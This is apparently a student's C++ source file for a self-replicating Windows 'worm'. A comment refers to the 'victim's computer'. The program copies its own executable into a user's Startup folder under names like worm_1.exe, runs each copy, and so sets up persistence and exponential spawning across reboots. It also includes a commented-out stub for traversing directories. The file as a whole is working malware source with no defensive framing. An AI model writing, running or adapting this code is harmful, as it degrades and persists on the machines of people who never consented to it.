#include <bits/stdc++.h>
#include <windows.h>
#include <fstream>
#include <string>

//Try to not use external libraries as it may not be present in the victim's computer

void executeExe(std::string newFilePath)
{
     // Execute the new file (assuming it's an executable)
     std::string command = '"' + newFilePath + '"';
     std::cout<<"Command: "<<" "<<'"' + command + '"' + "> nul"<<std::endl;
    system(command.c_str());
}
int copyFile()
{
    static int i=0;
    i++;
    // Path to the current executable file
    // std::string filePath = "C:\\Users\\akshi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\worm.exe";
    // std::cout<<filePath<<std::endl;
    char file[MAX_PATH];
    GetModuleFileNameA(NULL,file,MAX_PATH);
    std::string filePath = std::string(file);
    std::cout<<filePath<<std::endl;
    std::string dirPath = "C:\\Users\\akshi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
    std::string fileName = "\\worm"  + std::string("_") + std::to_string(i);

    // Open the current file for reading
    std::ifstream input(filePath, std::ios::binary);
    if (!input.is_open()) {
        std::cerr << "Error opening file!\n";
        return 1;
    }

    // Create a new file with "_copy" appended to the filename
    std::string newFilePath = dirPath + fileName + ".exe";
    std::cout<<newFilePath<<std::endl;
    std::ofstream output(newFilePath, std::ios::binary);
    if (!output.is_open()) {
        std::cerr << "Error creating new file!\n";
        return 1;
    }

    // Copy the contents of the current file to the new file
    output << input.rdbuf();

    // Close file streams
    input.close();
    output.close();
    executeExe(newFilePath);
    return i;

   
}


//Traversing Directories
// void traverse_directory(const std::wstring& path){
//     WIN32_FIND_DATA findFileData; 
//     HANDLE hFind = FindFirstFile((path + L"\\*").c_str(), &findFileData);

// }
int main()
{
    std::cout<<"hello";
    // int a=5;
    // std::cin>>a;
    while(true){
        if(copyFile()==5)
        break;
    }
}